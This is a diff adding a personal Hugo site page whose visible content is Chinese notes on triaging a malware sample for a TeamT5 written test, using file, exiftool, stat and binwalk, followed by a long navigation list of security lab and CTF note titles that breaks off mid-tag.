@@ -1,0 +1,940 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
+  TeamT5筆試題目筆記
+  #
+
+:::info
+前言: 通常我自己拿到一隻樣本，起手式會先搜一下hash，VirusTotal如果有紀錄的話最好，再來會丟到AnyRun看一下動態sandbox的狀態為何，但不確定這樣的操作是否符合本次筆試的預期，所以我會先設法在本機VM內分析看看，如果有利用這幾個online tools而得知的資訊，會再行標註
+:::
+:::danger
+經過二階面試後，用線上的工具例如VirusTotal和AnyRun都是被嚴格禁止的。
+第一個樣本總花費時間: 2天/第二個樣本總花費時間: 4天
+:::
+
+  樣本(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a)
+  #
+
+
+  惡意程式
+  #
+
+
+  檔案資訊
+  #
+
+
+
+DIE(Detect It Easy)
+
+看起來是一個HTML的純文字檔案
+
+
+File/Stat/Exiftool
+從以下結果來看，是一個SMTP的郵件檔案，並且是純文字的形式，所以直覺上可能和Outlook或是Firefox Thunderbird有關係，以binwalk的結果來說，他應該有壓縮一些內容在其中，如果實際丟到Any.Run的話會發現的確有很多檔案被compressed
+
+或者是說，從檔案內容來看(HxD)，會發現data帶了一個base64的file，decode會發現是0x50 4B 03 04
+:::spoiler Command Result
+$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators
+$ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+ExifTool Version Number         : 12.40
+File Name                       : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+Directory                       : .
+File Size                       : 180 KiB
+File Modification Date/Time     : 2023:08:14 11:54:39+08:00
+File Access Date/Time           : 2024:02:29 16:55:48+08:00
+File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
+File Permissions                : -rwxrwxrwx
+File Type                       : TXT
+File Type Extension             : txt
+MIME Type                       : text/plain
+MIME Encoding                   : us-ascii
+Newlines                        : Windows CRLF
+Line Count                      : 2410
+Word Count                      : 2741
+$ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+  File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+  Size: 184712          Blocks: 368        IO Block: 4096   regular file
+Device: 66h/102d        Inode: 1688849860790082  Links: 1
+Access: (0777/-rwxrwxrwx)  Uid: ( 1000/ sbk6401)   Gid: ( 1000/ sbk6401)
+Access: 2024-02-29 16:55:48.949690200 +0800
+Modify: 2023-08-14 11:54:39.000000000 +0800
+Change: 2024-02-29 16:55:48.949690200 +0800
+ Birth: -
+$ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+4244          0x1094          HTML document header
+5554          0x15B2          HTML document footer
+73264         0x11E30         StuffIt Deluxe Segment (data): fWm1
+169908        0x297B4         IMG0 (VxWorks) header, size: 218780743
+:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/docs/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="TeamT5筆試題目筆記"><meta property="og:description" content="TeamT5筆試題目筆記 # :::info 前言: 通常我自己拿到一隻樣本，起手式會先搜一下hash，VirusTotal如果有紀錄的話最好，再來會丟到AnyRun看一下動態sandbox的狀態為何，但不確定這樣的操作是否符合本次筆試的預期，所以我會先設法在本機VM內分析看看，如果有利用這幾個online tools而得知的資訊，會再行標註 ::: :::danger 經過二階面試後，用線上的工具例如VirusTotal和AnyRun都是被嚴格禁止的。 第一個樣本總花費時間: 2天/第二個樣本總花費時間: 4天 :::
+樣本(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a) # 惡意程式 # 檔案資訊 # DIE(Detect It Easy) 看起來是一個HTML的純文字檔案
+File/Stat/Exiftool 從以下結果來看，是一個SMTP的郵件檔案，並且是純文字的形式，所以直覺上可能和Outlook或是Firefox Thunderbird有關係，以binwalk的結果來說，他應該有壓縮一些內容在其中，如果實際丟到Any.Run的話會發現的確有很多檔案被compressed 或者是說，從檔案內容來看(HxD)，會發現data帶了一個base64的file，decode會發現是0x50 4B 03 04 :::spoiler Command Result
+$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators $ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a ExifTool Version Number : 12.40 File Name : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Directory : . File Size : 180 KiB File Modification Date/Time : 2023:08:14 11:54:39+08:00 File Access Date/Time : 2024:02:29 16:55:48+08:00 File Inode Change Date/Time : 2024:02:29 16:55:48+08:00 File Permissions : -rwxrwxrwx File Type : TXT File Type Extension : txt MIME Type : text/plain MIME Encoding : us-ascii Newlines : Windows CRLF Line Count : 2410 Word Count : 2741 $ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Size: 184712 Blocks: 368 IO Block: 4096 regular file Device: 66h/102d Inode: 1688849860790082 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 1000/ sbk6401) Gid: ( 1000/ sbk6401) Access: 2024-02-29 16:55:48.949690200 +0800 Modify: 2023-08-14 11:54:39.000000000 +0800 Change: 2024-02-29 16:55:48.949690200 +0800 Birth: - $ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 4244 0x1094 HTML document header 5554 0x15B2 HTML document footer 73264 0x11E30 StuffIt Deluxe Segment (data): fWm1 169908 0x297B4 IMG0 (VxWorks) header, size: 218780743 :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:tag" content="Interview"><title>TeamT5筆試題目筆記 | SBK Hugo Site</title>
+<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/docs/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.4967055fe1a48423194efe07d296bfc16f57543c8ef651b9f7ab22ea027b5227.js integrity="sha256-SWcFX+GkhCMZTv4H0pa/wW9XVDyO9lG596si6gJ7Uic=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><a href=/docs/security/practice/crewctf/reverse/crewctf---ohphp/>Crew Ctf Oh Php</a></li><li><a href=/docs/tools/ctf/all-pentest-tools/>All Pentest Tools</a></li><li><a href=/docs/problem-solutions/_wp-admin-vs-_wp-content-vs-_wp-include-vs-_wp-json/>/wp-admin VS /wp-content VS /wp-include VS /wp-json</a></li><li><a href=/docs/problem-solutions/sudo-chmod-777--r-_usr-problem/>`sudo chmod 777 -R /usr` Problem</a></li><li><a href=/docs/problem-solutions/~_.zshrc--initial-library/>~/.zshrc & Initial Library</a></li><li><a href=/docs/tools/others/_latex-%E8%AA%9E%E6%B3%95%E7%AD%86%E8%A8%98/>$\LaTeX$ 語法筆記</a></li><li><a href=/docs/side-project/a-hybrid-facial-expression-recognition-system-based-on-facial-features-and-pose-estimation/>A Hybrid Facial Expression Recognition System Based on Facial Features and Pose Estimation</a></li><li><a href=/docs/survey-papers/android-+-security/a-mitm-based-penetration-test-efficiency-improvement-approach-for-traffic-encrypted-mobile-apps-of-power-industry/>A MITM Based Penetration Test Efficiency Improvement Approach for Traffic-Encrypted Mobile Apps of Power Industry</a></li><li><a href=/docs/survey-papers/android-+-security/a-mitmproxy-based-dynamic-vulnerability-detection-system-for-android-applications/>A Mitmproxy-based Dynamic Vulnerability Detection System For Android Applications</a></li><li><a href=/docs/security/course/ntu-padns/ad-of-network-security---lab-12/>A&amp;D of Network Security - Lab 12</a></li><li><a href=/docs/security/course/ntu-padns/ad-of-network-security---lab-13/>A&amp;D of Network Security - Lab 13</a></li><li><a href=/docs/security/course/ntu-padns/ad-of-network-security---lab-14/>A&amp;D of Network Security - Lab 14</a></li><li><a href=/docs/security/course/ntu-padns/ad-of-network-security---lab-2/>A&amp;D of Network Security - Lab 2</a></li><li><a href=/docs/security/course/ntu-padns/ad-of-network-security---lab-3/>A&amp;D of Network Security - Lab 3</a></li><li><a href=/docs/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/>A&amp;D of Network Security - Lab 4(ARP & DNS SPOOFING)</a></li><li><a href=/docs/security/course/ntu-padns/ad-of-network-security---lab-7/>A&amp;D of Network Security - Lab 7</a></li><li><a href=/docs/security/course/ntu-padns/ad-of-network-security-note/>A&amp;D of Network Security Note</a></li><li><a href=/docs/security/practice/adworld/misc/adworld---3-1/>Adworld - 3-1</a></li><li><a href=/docs/security/practice/adworld/misc/adworld---miao~/>Adworld - miao~</a></li><li><a href=/docs/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/>Adworld - Misc文件類型</a></li><li><a href=/docs/security/practice/adworld/misc/adworld---pure_color/>Adworld - pure_color</a></li><li><a href=/docs/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/>Adworld - 心儀的公司</a></li><li><a href=/docs/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/>Adworld - 適合作為桌面</a></li><li><a href=/docs/knowledge/ai-prompt/>AI Prompt</a></li><li><a href=/docs/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/>AIS3 EOF 2023 初賽</a></li><li><a href=/docs/security/competition/ais3-eof-2024/>AIS3 EOF 2024</a></li><li><a href=/docs/security/competition/ais3-pre-exam-2023/>AIS3 Pre-Exam 2023</a></li><li><a href=/docs/terminology/android-related/>Android Related</a></li><li><a href=/docs/tools/others/android-app-crawler/app-crawler-overview/>App Crawler Overview</a></li><li><a href=/docs/tools/others/android-app-crawler/app-crawler-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/>App Crawler 無法使用紀錄</a></li><li><a href=/docs/tools/others/android-app-crawler/appcrawler/>AppCrawler</a></li><li><a href=/docs/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/>Background</a></li><li><a href=/docs/security/competition/balsnctf-2023/>BalsnCTF 2023</a></li><li><a href=/docs/security/practice/btlo/incident-response/btlo---bruteforce/>BTLO - Bruteforce</a></li><li><a href=/docs/security/practice/btlo/incident-response/btlo---follina/>BTLO - Follina</a></li><li><a href=/docs/security/practice/btlo/incident-response/btlo---log-analysis--compromised-wordpress/>BTLO - Log Analysis -Compromised WordPress</a></li><li><a href=/docs/security/practice/btlo/digital-forensic/btlo---meta/>BTLO - Meta</a></li><li><a href=/docs/security/practice/btlo/incident-response/btlo---paranoid/>BTLO - Paranoid</a></li><li><a href=/docs/security/practice/btlo/security-operation/btlo---phishing-analysis/>BTLO - Phishing Analysis</a></li><li><a href=/docs/security/practice/btlo/incident-response/btlo---secrets/>BTLO - Secrets</a></li><li><a href=/docs/security/practice/btlo/digital-forensic/btlo---shiba-insider/>BTLO - Shiba Insider</a></li><li><a href=/docs/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/>CGGC 2023 初賽</a></li><li><a href=/docs/tools/others/command-cheat-sheet/>Command Cheat Sheet</a></li><li><a href=/docs/problem-solutions/createprocessentrycommon_586_-create-process-not-expected-to-return/>CreateProcessEntryCommon:586: Create process not expected to return</a></li><li><a href=/docs/security/practice/crewctf/bad/crewctf---_-1_-questions/>CrewCTF - :-1: Questions</a></li><li><a href=/docs/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/>CrewCTF - Attaaaaack 1-13</a></li><li><a href=/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-1/>CrewCTF - Encrypt10n(Part 1)</a></li><li><a href=/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-2/>CrewCTF - Encrypt10n(Part 2)</a></li><li><a href=/docs/security/practice/crewctf/reverse/crewctf---ez-rev/>CrewCTF - ez rev</a></li><li><a href=/docs/security/practice/crewctf/web/crewctf---sequence_gallery/>CrewCTF - sequence_gallery</a></li><li><a href=/docs/survey-papers/android-+-security/cross-site-scripting-attacks-on-android-hybrid-applications/>Cross-site Scripting Attacks on Android Hybrid Applications</a></li><li><a href=/docs/tools/ctf/crypto-cheat-sheet/>Crypto Cheat Sheet</a></li><li><a href=/docs/security/course/ntu-cns/cryptography-and-network-security---final-project/>Cryptography and Network Security - Final Project</a></li><li><a href=/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/>Cryptography and Network Security - Regular Critique 2</a></li><li><a href=/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/>Cryptography and Network Security – Comparative Critique 1</a></li><li><a href=/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/>Cryptography and Network Security – Comparative Critique 2</a></li><li><a href=/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/>Cryptography and Network Security – Comparative Critique 3</a></li><li><a href=/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/>Cryptography and Network Security – Homework 1</a></li><li><a href=/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/>Cryptography and Network Security – Homework 2</a></li><li><a href=/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/>Cryptography and Network Security – Homework 3</a></li><li><a href=/docs/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/>Cryptography and Network Security – HW0</a></li><li><a href=/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/>Cryptography and Network Security – Regular Critique 3</a></li><li><a href=/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/>Cryptography and Network Security – Regular Critique 4</a></li><li><a href=/docs/security/course/ntu-crypto/cryptography-lec-1overview---notes/>Cryptography Lec 1(Overview) - Notes</a></li><li><a href=/docs/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/>Cryptography Lec 2(Historical Ciphers) - Notes</a></li><li><a href=/docs/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/>Cryptography Lec 3(Mathematical Background) - Notes</a></li><li><a href=/docs/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/>Cryptography Lec 4(Information Theory) - Notes</a></li><li><a href=/docs/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/>Cryptography Lec 5(Symmetric Key Cryptography) - Notes</a></li><li><a href=/docs/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/>Cryptography Lec 6(Key Agreement Protocol) - Notes</a></li><li><a href=/docs/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/>CSC 2023 決賽</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/>CSRF - APPRENTICE</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/cyberdefender---blackenergy/>CyberDefender - BlackEnergy</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-1/>CyberDefender - CorporateSecrets (Part 1)</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-2/>CyberDefender - CorporateSecrets (Part 2)</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-3/>CyberDefender - CorporateSecrets (Part 3)</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-4/>CyberDefender - CorporateSecrets (Part 4)</a></li><li><a href=/docs/security/practice/cyberdefender/threat-intel/cyberdefender---grabthephisher/>CyberDefender - GrabThePhisher</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-1/>CyberDefender - Hunter (Part 1)</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-2/>CyberDefender - Hunter (Part 2)</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-3/>CyberDefender - Hunter (Part 3)</a></li><li><a href=/docs/security/practice/cyberdefender/threat-intel/cyberdefender---intel101/>CyberDefender - Intel101</a></li><li><a href=/docs/security/practice/cyberdefender/cyberdefender---krakenkeylogger/>CyberDefender - KrakenKeylogger</a></li><li><a href=/docs/security/practice/cyberdefender/threat-intel/cyberdefender---lespion/>CyberDefender - L'espion</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---pos/>CyberDefender - MrRobot - POS</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-2/>CyberDefender - MrRobot - Target 2</a></li><li><a href=/docs/security/practice/cyberdefender/network-forensic/cyberdefender---poisonedcredentials/>CyberDefender - PoisonedCredentials</a></li><li><a href=/docs/security/practice/cyberdefender/network-forensic/cyberdefender---psexec-hunt/>CyberDefender - PsExec Hunt</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/cyberdefender---redline/>CyberDefender - RedLine</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/cyberdefender---spotlight/>CyberDefender - Spotlight</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-1/>CyberDefender - Szechuan Sauce (Part 1)</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-2/>CyberDefender - Szechuan Sauce (Part 2)</a></li><li><a href=/docs/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/>CyberDefender - Tomcat Takeover</a></li><li><a href=/docs/security/practice/cyberdefender/network-forensic/cyberdefender---webstrike/>CyberDefender - WebStrike</a></li><li><a href=/docs/data-structure/data-structure/>Data Structure</a></li><li><a href=/docs/security/competition/deadface-ctf-2023/>DEADFACE CTF 2023</a></li><li><a href=/docs/survey-papers/ml-dl-+-security/deepcase-semi-supervised-contextual-analysis-of-security-events---notes/>DEEPCASE Semi-Supervised Contextual Analysis of Security Events - Notes</a></li><li><a href=/docs/survey-papers/ml-dl-+-security/deeplog_-anomaly-detection-and-diagnosis-from-system-logs-through-deep-learning/>DeepLog: Anomaly Detection and Diagnosis from System Logs through Deep Learning</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/>Deserialization - APPRENTICE</a></li><li><a href=/docs/tools/others/directory-fuzzing---traversal-tools/directory-fuzzing_traversal-tools/>Directory Fuzzing/Traversal Tools</a></li><li><a href=/docs/tools/others/docker-cheat-sheet/>Docker Cheat Sheet</a></li><li><a href=/docs/tools/others/android-app-crawler/droidbot/>Droidbot</a></li><li><a href=/docs/tools/others/android-related/drozer/drozer-cheat-sheet/>Drozer Cheat Sheet</a></li><li><a href=/docs/tools/others/android-related/installation/drozer_mobsf-installation/>Drozer/MobSF Installation</a></li><li><a href=/docs/survey-papers/federated-learning/eiffel_-ensuring-integrity-for-federated-learning---notes/>EIFFeL: Ensuring Integrity For Federated Learning - Notes</a></li><li><a href=/docs/problem-solutions/endnote---invalid-citation/>Endnote - Invalid Citation</a></li><li><a href=/docs/knowledge/english-writing-vocabulary/>English Writing Vocabulary</a></li><li><a href=/docs/security/competition/eof-ais3-final/>EOF AIS3 Final</a></li><li><a href=/docs/survey-papers/android-+-security/exploiting-ml-alg-for-efficient-detection-and-prevention-of-js-xss-attacks-in-android-based-hybrid-applications/>Exploiting ML ALG for Efficient Detection and Prevention of JS-XSS Attacks in Android Based Hybrid Applications</a></li><li><a href=/docs/tools/others/android-app-crawler/fastbot-android/>Fastbot Android</a></li><li><a href=/docs/survey-papers/android-+-security/gui-testing/fastbot_-a-multi-agent-model-based-test-generation-system/>Fastbot: A Multi-Agent Model-Based Test Generation System</a></li><li><a href=/docs/survey-papers/android-+-security/gui-testing/fastbot2_-reusable-automated-model-based-gui-testing-for-android-enhanced-by-reinforcement-learning/>Fastbot2: Reusable Automated Model-based GUI Testing for Android Enhanced by Reinforcement Learning</a></li><li><a href=/docs/problem-solutions/fatal_-authentication-failed-for-https___github.com_username_repository.git_/>fatal: Authentication failed for `'https://github.com/{username}/{repository}.git/'`</a></li><li><a href=/docs/survey-papers/federated-learning/fedml-he---an-efficient-homomorphic-encryption-based-privacy-preserving-federated-learning-system---notes/>FedML-HE - An Efficient Homomorphic-Encryption-Based Privacy-Preserving Federated Learning System - Notes</a></li><li><a href=/docs/tools/ctf/forensics-cheat-sheet/>Forensics Cheat Sheet</a></li><li><a href=/docs/problem-solutions/git-large-file-error---solution/>Git Large File Error - Solution</a></li><li><a href=/docs/security/practice/hackthebox/hackthebox/>HackTheBox</a></li><li><a href=/docs/problem-solutions/how-how-to-use-mailgun_resend-as-smtp-server_/>How How to use Mailgun/Resend as SMTP server?</a></li><li><a href=/docs/problem-solutions/how-to-address-docker-compose-not-found_/>How to address docker compose not found?</a></li><li><a href=/docs/problem-solutions/how-to-adjust-endnotes-paragraph-in-word_/>How to adjust Endnote's Paragraph in Word?</a></li><li><a href=/docs/problem-solutions/how-to-build-apk-file-on-react-native-project_/>How to build apk file on React-Native Project?</a></li><li><a href=/docs/problem-solutions/how-to-check-if-the-paper-is-top-conference-or-q1-journal_/>How to check if the paper is Top Conference or Q1 Journal?</a></li><li><a href=/docs/problem-solutions/how-to-download-blob-videos_/>How to download blob videos?</a></li><li><a href=/docs/problem-solutions/how-to-install-aab-file_/>How to install aab file?</a></li><li><a href=/docs/problem-solutions/how-to-install-logontracer_/>How to install LogonTracer?</a></li><li><a href=/docs/problem-solutions/how-to-root-android-phone--install-alwaystrustusercert.zip-module_/>How to Root Android Phone & Install AlwaysTrustUserCert.zip Module?</a></li><li><a href=/docs/survey-papers/crypto/how-to-securely-collaborate-on-data_-decentralized-threshold-he-and-secure-key-update---notes/>How to Securely Collaborate on Data: Decentralized Threshold HE and Secure Key Update - Notes</a></li><li><a href=/docs/problem-solutions/how-to-use-vscode-_-web-storm-debug-js_/>How to use VScode / Web Storm Debug JS?</a></li><li><a href=/docs/problem-solutions/how-to-use-zap_burp-suite_mitmproxy-as-proxy-for-android_/>How to use ZAP/Burp Suite/mitmproxy as Proxy for Android?</a></li><li><a href=/docs/survey-papers/android-+-security/identifying-vulnerabilities-of-ssl_tls-certificate-verification-in-android-apps-with-static-and-dynamic-analysis/>Identifying vulnerabilities of SSL/TLS certificate verification in Android apps with static and dynamic analysis</a></li><li><a href=/docs/books-notes/jane-eyre-%E7%B0%A1%E6%84%9B/>Jane Eyre (簡愛)</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/>Lab: Arbitrary object injection in PHP</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/>Lab: Blind XXE with out-of-band interaction</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/>Lab: Blind XXE with out-of-band interaction via XML parameter entities</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/>Lab: CSRF where token is not tied to user session</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/>Lab: CSRF where token is tied to non-session cookie</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/>Lab: CSRF where token validation depends on request method</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/>Lab: CSRF where token validation depends on token being present</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/>Lab: Exploiting `XInclude` to retrieve files</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/>Lab: Exploiting blind XXE to retrieve data via error messages</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/>Lab: Exploiting Java deserialization with Apache Commons</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/>Lab: Exploiting XXE via image file upload</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/>Lab: Modifying serialized data types</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/>Lab: SQL injection attack, listing the database contents on Oracle</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/>Lab: SQL injection attack, querying the database type and version on Oracle</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/>Lab: SQL injection UNION attack, determining the number of columns returned by the query</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/>Lab: SQL injection UNION attack, finding a column containing text</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/>Lab: SQL injection UNION attack, retrieving data from other tables</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/>Lab: SQL injection UNION attack, retrieving multiple values in a single column</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/>Lab: Stored DOM XSS</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/>Lab: Using application functionality to exploit insecure deserialization</a></li><li><a href=/docs/data-structure/lecture-10/>Lecture 10</a></li><li><a href=/docs/data-structure/lecture-2/>Lecture 2</a></li><li><a href=/docs/data-structure/lecture-4/>Lecture 4</a></li><li><a href=/docs/data-structure/lecture-6/>Lecture 6</a></li><li><a href=/docs/data-structure/lecture-8/>Lecture 8</a></li><li><a href=/docs/leetcode/easy/leetcode---two-sum/>LeetCode - Two Sum</a></li><li><a 